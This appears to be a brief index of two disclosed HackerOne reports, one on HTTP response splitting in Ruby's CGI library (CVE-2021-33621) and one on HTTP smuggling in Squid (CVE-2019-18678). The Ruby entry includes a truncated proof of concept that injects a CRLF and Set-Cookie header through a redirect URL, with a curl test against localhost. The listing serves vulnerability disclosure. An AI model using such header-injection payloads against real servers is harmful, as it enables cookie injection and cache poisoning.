# HTTP Response Splitting

_2 reports — High/Critical, disclosed_

- **RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する** — `Ruby` · `High` [↗](https://hackerone.com/reports/1204695)
  - `CVE-2021-33621` require 'cgi' cgi = CGI.new url = "http://example.jp\r\nSet-Cookie: foo=bar;" # External Parameter print cgi.header({'status' => '302 Found', 'Location' => url}) $ curl -s -i http://localhost:8080/cgi-bin/cgi.ru HTTP/1.1 302 Found Date: Fri, 21 May 2021 00:46:33 GMT Server: A
- **HTTP Smuggling multiple issues in Squid 3.x & squid 4.x** — `Internet Bug Bounty` · `Critical` [↗](https://hackerone.com/reports/758445)
  - `CVE-2019-18678` Hello, as can be seen on a recent public security update by Squid I reported several smuggling issues.
